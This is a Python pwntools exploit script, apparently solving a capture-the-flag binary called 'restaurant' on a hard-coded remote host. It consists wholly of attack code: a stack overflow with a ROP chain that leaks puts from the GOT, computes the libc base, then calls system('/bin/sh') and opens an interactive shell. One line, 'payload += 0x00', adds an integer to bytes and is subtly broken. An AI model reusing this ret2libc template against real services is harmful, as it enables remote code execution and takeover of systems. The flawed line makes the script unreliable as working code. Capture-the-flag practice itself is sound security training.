#!/usr/bin/env python3

from pwn import *
import base64

e = ELF("./restaurant")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")


HOST = "94.237.60.55"
PORT = 38156
context.binary = e
context.terminal = ['tmux', 'splitw', '-h']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([e.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote(HOST, PORT)

    return r


def main():
    r = conn()

    rbp_offset = 32
    rip_offset = 32 + 8

    r.sendlineafter('>', '1')

    pop_rdi_ret = 0x4010a3
    puts_got = e.got['puts']
    puts_plt = e.plt['puts']
    main = e.symbols['main']

    info(hex(puts_plt))
    info(hex(puts_got))
    info(hex(main))

    payload = b'A' * rip_offset
    payload += p64(pop_rdi_ret)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)

    r.sendlineafter('>',payload)
    data = r.readline_contains("Enjoy")
    info(base64.b64encode(data))

    leak = u64(data[-6:].ljust(8, b'\x00'))
    info(f"Leak puts_got: {hex(leak)}")

    libc_base   = leak - libc.symbols['puts']
    libc.address = libc_base
    info(f"Libc base: {hex(libc_base)}")

    r.sendlineafter('>', '1')

    sh = next(libc.search(b"/bin/sh"))
    system = libc.sym["system"]
    exit = libc.sym["exit"]

    ret = 0x40063e

    payload = b"A" * rip_offset
    payload += p64(ret)
    payload += p64(pop_rdi_ret)
    payload += p64(sh)
    payload += p64(system)
    payload += 0x00

    r.sendlineafter('>', payload)

    r.interactive()


if __name__ == "__main__":
    main()

